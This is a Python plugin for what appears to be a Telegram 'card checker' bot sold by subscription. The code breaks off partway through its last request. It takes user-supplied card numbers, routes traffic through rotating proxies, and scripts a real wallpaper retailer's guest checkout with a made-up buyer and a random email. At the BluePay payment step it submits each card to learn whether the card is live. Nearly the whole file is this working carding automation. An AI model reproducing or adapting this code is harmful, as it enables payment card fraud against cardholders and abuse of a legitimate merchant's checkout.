import json
import base64
import requests
from Plugins.SegundoPlano.antispam import *
from parse import parseX
import check_template
import names
import re
import AdyenEncrypt
import uuid
import parser_kurama
import time
import random
from func_bin import get_bin_info
from Plugins.Func import connect_to_db
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from requests.exceptions import ProxyError, ConnectionError

max_retries = 3
retry_delay = 3

proxiess = "proxys.txt"

keyboard = InlineKeyboardMarkup(
    [
        [InlineKeyboardButton("Premium for only $3", url="https://t.me/RefeDarwinScrapper/9175")]
    ]
)

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session

COMMAND_STATUS_FILE = "command_status.txt"

def is_command_enabled(command_name):
    with open(COMMAND_STATUS_FILE, "r") as f:
        command_status = f.read().splitlines()
    for line in command_status:
        name, status = line.split(":")
        if name == command_name:
            return status == "on"
    return False


name_gate = "BluePay"
subtype = "$15"
command = "blu"

@Client.on_message(filters.command([f"{command}"], prefixes=['.', '/', '!', '?'], case_sensitive=False) & filters.text)
def braintree1(client, message, command=command):
    if not is_command_enabled(f"{command}"):
            return message.reply(f""" <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a> 
━━━━━✧𝑲𝒖𝒓𝒂𝒎𝒂𝑪𝒉𝒌✧━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] STATUS ↯ <code>MANTENIMIENTO | OFF ❌</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] GATEWAY ↯  <code>{name_gate}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] SUBTYPE ↯  <code>{subtype}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] USE ↯ <code>PREMIUM PLAN</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] VERSIÓN ↯ 6.0
━━━━━━━━━✧♛✧━━━━━━━━  </b> """, reply_markup=keyboard)
    username = message.from_user.username
    chat_id = message.chat.id
    user_id = message.from_user.id
    command = command
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    spam_message = antispam(user_id, command, message)
    if spam_message is not None:
        message.reply(spam_message)
        return        
            #--------- VERIFICACION DE BIN BANEADOS ----------#
    
    ccs = message.text[len(f"/{command} "):]  
    reply = message.reply_to_message
    
    
    
    try:
        if not ccs:
            reply = message.reply_to_message
            texto = reply.text[:6]
        else:
            texto = ccs[:6]
    
        
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                return
            
    except:
        pass
        
    
    try:
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                return
        
    except:
        pass
            
    conn = connect_to_db()
    cursor = conn.cursor()
    user_id = message.from_user.id
    username = message.from_user.username  
    
    cursor.execute('SELECT rango, creditos, antispam, dias FROM users WHERE user_id = ?', (user_id,))
    user_data = cursor.fetchone()
    if not user_data:
                return message.reply(f"<b>First, you must register. /register .</b> ")
            
    if user_data[0] in ["Baneado", "baneado"]:
        return message.reply(f"<b>You are not allowed to use the \nReason: Banned bot❌. </b> ")
           
    chat_id2 = message.chat.id
    chat_data = cursor.execute('SELECT rango FROM users WHERE user_id = ?', (chat_id2,))
    chat_data = cursor.fetchone()
    
    if chat_data is None:
        chat_data = "Free"
        
        
           
    if all(role not in user_data[0] for role in ["Premium", "Seller", "Owner"]) and all(role not in chat_data[0] for role in ["Staff", "Staff"]):
            return message.reply(f"<b>The chat is not authorized to use this command. Contact admin @Crypto_locker5 ❌</b> <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a>", reply_markup=keyboard)
        
    
  
    ccs = message.text[len(f"/{command} "):]  
                  
      
    reply = message.reply_to_message
            
    if not ccs:
        if not reply or not reply.text:
            return message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate}</code>   
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Subtype ↯ <code>{subtype}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Use ↯ <code>${command} cc|month|year|cvv</code>
━━━━━━━━━━━━━━━━
</b>""", reply_markup=keyboard, disable_web_page_preview=True)
     

        ccs = reply.text
        

    result = parser_kurama.parseData(ccs)
    x = get_bin_info(ccs[:6])

    if 'error' in result:
        return message.reply(f"""<b> 
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate} {subtype}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>DECLINED ❌</b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Result ↯ Card Invalid!
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Checked by ↯ @{username} [{user_data[0]}]
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bot by ↯ @Crypto_locker5

</b>""", reply_markup=keyboard, disable_web_page_preview=True)
            
        
    ccnum = result['ccnum']
    mes = result['month']
    ano = result['year']
    if len(ano) == 2:
        ano = '20'+result['year']
    cvv = result['cvv']
    ccs = f"{ccnum}|{mes}|{ano}|{cvv}"
    
    
    req = requests.get(f"https://bins.antipublic.cc/bins/{ccnum[:6]}").json()      
    brand = req['brand']
    CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
    x = get_bin_info(ccnum[:6])
        
    #---------- PLANTILLA DE CARGA #1 ------------#
    loading_message = message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate} {subtype}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>Loading...</b> 
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━  </b>""", reply_markup=keyboard, disable_web_page_preview=True)
    
    SessionId = generar_codigo_session()
    session = requests.Session()
    
    with open(proxiess, 'r') as file:
        proxies_1 = file.read().splitlines()
            
        session = requests.Session()
        proxie = random.choice(proxies_1)

        session.proxies = {
        'https': f'{proxie}'}
    
    inicio = time.time()

    #------------------- #1 Requests -------------------#
    try:
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            # 'Cookie': 'ApplicationGatewayAffinityCORS=3cc03639d34fac221110d10f7b242a90; ApplicationGatewayAffinity=3cc03639d34fac221110d10f7b242a90; _gid=GA1.2.1917306079.1710765996; _fbp=fb.1.1710765996195.519488570; _pin_unauth=dWlkPU9XTmhPRGhtWlRNdFkySTJPQzAwT0RSbExUZzRNRGN0TURReVltWTNNV0V3WXpKaQ; .Nop.Antiforgery=CfDJ8N2oz7D5mAJKrVJ8sD-OSVvS2PC1dcOsu_GuyQIKsmnFnOOODFC2FY4AsHT9AxZWxH1QLuDivwsEuoGrK-l8OXmnHVt3XVhhAW3jyNimkIXM3Yj5h-6Ow1iEk2I5YPclPDhFk-fKftdGstxQmJmYvic; _gat_UA-12732299-2=1; .Nop.RecentlyViewedProducts=4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV_ga_PYFYE14N1X=GS1.1.1710765995.1.1.1710766194.50.0.0',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        response = session.get(
            'https://www.brewsterwallcovering.com/2767-23783-light-grey-glass-tile-wallpaper/2767-23783SAM',
            #cookies=cookies,
            headers=headers,
        ).text
        
        
        verftoken = parseX(response, '__RequestVerificationToken type=hidden value=', '>')
        
        
        
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'Cookie': 'ApplicationGatewayAffinityCORS=3cc03639d34fac221110d10f7b242a90; ApplicationGatewayAffinity=3cc03639d34fac221110d10f7b242a90; _gid=GA1.2.1917306079.1710765996; _fbp=fb.1.1710765996195.519488570; _pin_unauth=dWlkPU9XTmhPRGhtWlRNdFkySTJPQzAwT0RSbExUZzRNRGN0TURReVltWTNNV0V3WXpKaQ; .Nop.Antiforgery=CfDJ8N2oz7D5mAJKrVJ8sD-OSVvS2PC1dcOsu_GuyQIKsmnFnOOODFC2FY4AsHT9AxZWxH1QLuDivwsEuoGrK-l8OXmnHVt3XVhhAW3jyNimkIXM3Yj5h-6Ow1iEk2I5YPclPDhFk-fKftdGstxQmJmYvic; _gat_UA-12732299-2=1; .Nop.RecentlyViewedProducts=4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV_ga_PYFYE14N1X=GS1.1.1710765995.1.1.1710766238.6.0.0',
            'Origin': 'https://www.brewsterwallcovering.com',
            #'Referer': 'https://www.brewsterwallcovering.com/2767-23783-light-grey-glass-tile-wallpaper/2767-23783SAM',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'product_attribute_13521': '27059',
            'addtocart_43209.EnteredQuantity': '1',
            'addtocart_43210.EnteredQuantity': '1',
            'AddProductReview.Rating': '5',
            #'g-recaptcha-response': '',
            '__RequestVerificationToken': verftoken,
            'productId': '43210',
            'isAddToCartButton': 'true',
        }

        response = session.post(
            'https://www.brewsterwallcovering.com/AddProductFromProductDetailsPageToCartAjax',
            headers=headers,
            data=data,
        )
        
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarydDYiiiqqlucxl2Yv',
            # 'Cookie': 'ApplicationGatewayAffinityCORS=3cc03639d34fac221110d10f7b242a90; ApplicationGatewayAffinity=3cc03639d34fac221110d10f7b242a90; _gid=GA1.2.1917306079.1710765996; _fbp=fb.1.1710765996195.519488570; _pin_unauth=dWlkPU9XTmhPRGhtWlRNdFkySTJPQzAwT0RSbExUZzRNRGN0TURReVltWTNNV0V3WXpKaQ; .Nop.Antiforgery=CfDJ8N2oz7D5mAJKrVJ8sD-OSVvS2PC1dcOsu_GuyQIKsmnFnOOODFC2FY4AsHT9AxZWxH1QLuDivwsEuoGrK-l8OXmnHVt3XVhhAW3jyNimkIXM3Yj5h-6Ow1iEk2I5YPclPDhFk-fKftdGstxQmJmYvic; .Nop.RecentlyViewedProducts=4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV12732299-2=1; _ga_PYFYE14N1X=GS1.1.1710765995.1.1.1710766888.60.0.0',
            'Origin': 'https://www.brewsterwallcovering.com',
            'Referer': 'https://www.brewsterwallcovering.com/cart',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        files = {
            'itemquantity1895586': (None, '1'),
            'discountcouponcode': (None, ''),
            'checkout': (None, 'checkout'),
            '__RequestVerificationToken': (None, verftoken),
        }

        response = session.post('https://www.brewsterwallcovering.com/cart', headers=headers, files=files)
        
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'Connection': 'keep-alive',
            # 'Cookie': 'ApplicationGatewayAffinityCORS=3cc03639d34fac221110d10f7b242a90; ApplicationGatewayAffinity=3cc03639d34fac221110d10f7b242a90; _gid=GA1.2.1917306079.1710765996; _fbp=fb.1.1710765996195.519488570; _pin_unauth=dWlkPU9XTmhPRGhtWlRNdFkySTJPQzAwT0RSbExUZzRNRGN0TURReVltWTNNV0V3WXpKaQ; .Nop.Antiforgery=CfDJ8N2oz7D5mAJKrVJ8sD-OSVvS2PC1dcOsu_GuyQIKsmnFnOOODFC2FY4AsHT9AxZWxH1QLuDivwsEuoGrK-l8OXmnHVt3XVhhAW3jyNimkIXM3Yj5h-6Ow1iEk2I5YPclPDhFk-fKftdGstxQmJmYvic; .Nop.RecentlyViewedProducts=4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVCustomer=b37d245e-6d04-4bcc-95ae-66751ac80b1e',
            'Referer': 'https://www.brewsterwallcovering.com/login/checkoutasguest?returnUrl=%2Fcart',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        response = session.get('https://www.brewsterwallcovering.com/checkout', headers=headers).text
        
        verftoken = parseX(response, '__RequestVerificationToken type=hidden value=', '>')
        
    
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            # 'Cookie': 'ApplicationGatewayAffinityCORS=3cc03639d34fac221110d10f7b242a90; ApplicationGatewayAffinity=3cc03639d34fac221110d10f7b242a90; _gid=GA1.2.1917306079.1710765996; _fbp=fb.1.1710765996195.519488570; _pin_unauth=dWlkPU9XTmhPRGhtWlRNdFkySTJPQzAwT0RSbExUZzRNRGN0TURReVltWTNNV0V3WXpKaQ; .Nop.Antiforgery=CfDJ8N2oz7D5mAJKrVJ8sD-OSVvS2PC1dcOsu_GuyQIKsmnFnOOODFC2FY4AsHT9AxZWxH1QLuDivwsEuoGrK-l8OXmnHVt3XVhhAW3jyNimkIXM3Yj5h-6Ow1iEk2I5YPclPDhFk-fKftdGstxQmJmYvic; .Nop.RecentlyViewedProducts=4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV12732299-2=1; _ga_PYFYE14N1X=GS1.1.1710765995.1.1.1710767249.60.0.0',
            'Origin': 'https://www.brewsterwallcovering.com',
            'Referer': 'https://www.brewsterwallcovering.com/checkout/billingaddress',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            "ShipToSameAddress": True,
            "NewsLetterOptIn": True,
            "BillingNewAddress.Id": 0,
            "BillingNewAddress.FirstName": "Juan",
            "BillingNewAddress.LastName": "Smith",
            "BillingNewAddress.Email": CorreoRand,
            "BillingNewAddress.Company": "",
            "BillingNewAddress.CountryId": 1,
            "BillingNewAddress.StateProvinceId": 40,
            "BillingNewAddress.City": "New York",
            "BillingNewAddress.Address1": "Street 16th av. billonarie",
            "BillingNewAddress.Address2": "",
            "BillingNewAddress.ZipPostalCode": 10080,
            "BillingNewAddress.PhoneNumber": 3056473645,
            "nextstep": "",
            "__RequestVerificationToken": verftoken
        }

        response = session.post(
            'https://www.brewsterwallcovering.com/checkout/billingaddress',
            headers=headers,
            data=data,
        ).text
        
        verftoken = parseX(response, '__RequestVerificationToken type=hidden value=', '>')
        
        
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            # 'Cookie': 'ApplicationGatewayAffinityCORS=3cc03639d34fac221110d10f7b242a90; ApplicationGatewayAffinity=3cc03639d34fac221110d10f7b242a90; _gid=GA1.2.1917306079.1710765996; _fbp=fb.1.1710765996195.519488570; _pin_unauth=dWlkPU9XTmhPRGhtWlRNdFkySTJPQzAwT0RSbExUZzRNRGN0TURReVltWTNNV0V3WXpKaQ; .Nop.Antiforgery=CfDJ8N2oz7D5mAJKrVJ8sD-OSVvS2PC1dcOsu_GuyQIKsmnFnOOODFC2FY4AsHT9AxZWxH1QLuDivwsEuoGrK-l8OXmnHVt3XVhhAW3jyNimkIXM3Yj5h-6Ow1iEk2I5YPclPDhFk-fKftdGstxQmJmYvic; .Nop.RecentlyViewedProducts=4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV_ga_PYFYE14N1X=GS1.1.1710765995.1.1.1710767452.60.0.0',
            'Origin': 'https://www.brewsterwallcovering.com',
            'Referer': 'https://www.brewsterwallcovering.com/checkout/shippingmethod',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'shippingoption': 'Sample Shipping - No Tracking___BrewsterCustom.BrewsterCustomComputationMethod',
            'nextstep': '',
            '__RequestVerificationToken': verftoken,
        }

        response = session.post(
            'https://www.brewsterwallcovering.com/checkout/shippingmethod',
            headers=headers,
            data=data,
        ).text
        
        verftoken = parseX(response, '__RequestVerificationToken type=hidden value=', '>')
        
        

        
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            # 'Cookie': 'ApplicationGatewayAffinityCORS=3cc03639d34fac221110d10f7b242a90; ApplicationGatewayAffinity=3cc03639d34fac221110d10f7b242a90; _gid=GA1.2.1917306079.1710765996; _fbp=fb.1.1710765996195.519488570; _pin_unauth=dWlkPU9XTmhPRGhtWlRNdFkySTJPQzAwT0RSbExUZzRNRGN0TURReVltWTNNV0V3WXpKaQ; .Nop.Antiforgery=CfDJ8N2oz7D5mAJKrVJ8sD-OSVvS2PC1dcOsu_GuyQIKsmnFnOOODFC2FY4AsHT9AxZWxH1QLuDivwsEuoGrK-l8OXmnHVt3XVhhAW3jyNimkIXM3Yj5h-6Ow1iEk2I5YPclPDhFk-fKftdGstxQmJmYvic; .Nop.RecentlyViewedProducts=4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV_ga_PYFYE14N1X=GS1.1.1710765995.1.1.1710768315.60.0.0',
            'Origin': 'https://www.brewsterwallcovering.com',
            'Referer': 'https://www.brewsterwallcovering.com/checkout/paymentmethod',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'paymentmethod': 'Payments.BluePay',
            'nextstep': '',
            '__RequestVerificationToken': verftoken,
        }

        response = session.post(
            'https://www.brewsterwallcovering.com/checkout/paymentmethod',
            headers=headers,
            data=data,
        ).text
        
        verftoken = parseX(response, '__RequestVerificationToken type=hidden value=', '>')
        

            
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            # 'Cookie': 'ApplicationGatewayAffinityCORS=3cc03639d34fac221110d10f7b242a90; ApplicationGatewayAffinity=3cc03639d34fac221110d10f7b242a90; _gid=GA1.2.1917306079.1710765996; _fbp=fb.1.1710765996195.519488570; _pin_unauth=dWlkPU9XTmhPRGhtWlRNdFkySTJPQzAwT0RSbExUZzRNRGN0TURReVltWTNNV0V3WXpKaQ; .Nop.Antiforgery=CfDJ8N2oz7D5mAJKrVJ8sD-OSVvS2PC1dcOsu_GuyQIKsmnFnOOODFC2FY4AsHT9AxZWxH1QLuDivwsEuoGrK-l8OXmnHVt3XVhhAW3jyNimkIXM3Yj5h-6Ow1iEk2I5YPclPDhFk-fKftdGstxQmJmYvic; .Nop.RecentlyViewedProducts=4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV_ga_PYFYE14N1X=GS1.1.1710765995.1.1.1710768558.41.0.0',
            'Origin': 'https://www.brewsterwallcovering.com',
            'Referer': 'https://www.brewsterwallcovering.com/checkout/paymentinfo',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'CardNumber': ccnum,
            'ExpireMonth': mes,
            'ExpireYear': ano,
            'CardCode': cvv,
            'nextstep': '',
            '__RequestVerificationToken': verftoken
        }

        response = session.post('https://www.brewsterwallcovering.com/checkout/paymentinfo', headers=headers, data=data).text
        
        verftoken = parseX(response, '__RequestVerificationToken type=hidden value=', '>')
        
        
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            # 'Cookie': 'ApplicationGatewayAffinityCORS=3cc03639d34fac221110d10f7b242a90; ApplicationGatewayAffinity=3cc03639d34fac221110d10f7b242a90; _gid=GA1.2.1917306079.1710765996; _fbp=fb.1.1710765996195.519488570; _pin_unauth=dWlkPU9XTmhPRGhtWlRNdFkySTJPQzAwT0RSbExUZzRNRGN0TURReVltWTNNV0V3WXpKaQ; .Nop.Antiforgery=CfDJ8N2oz7D5mAJKrVJ8sD-OSVvS2PC1dcOsu_GuyQIKsmnFnOOODFC2FY4AsHT9AxZWxH1QLuDivwsEuoGrK-l8OXmnHVt3XVhhAW3jyNimkIXM3Yj5h-6Ow1iEk2I5YPclPDhFk-fKftdGstxQmJmYvic; .Nop.RecentlyViewedProducts=4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV2BHWSFVsMOxALokeqPnYDBXiXduRBLf2iqqVgqMHO5NS7uWGzo6r9VtT9iysWw1zo3RCVig0tZjOdOpCyHg2t3oNO7iHgHtEgWwTQOvPLJM3M8f; .Nop.Customer=b37d245e-6d04-4bcc-95ae-66751ac80b1e; _ga=GA1.2.163664898.1710765996; _gat_UA-12732299-2=1; _ga_PYFYE14N1X=GS1.1.1710765995.1.1.1710769315.60.0.0',
            'Origin': 'https://www.brewsterwallcovering.com',
            'Referer': 'https://www.brewsterwallcovering.com/checkout/confirm',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
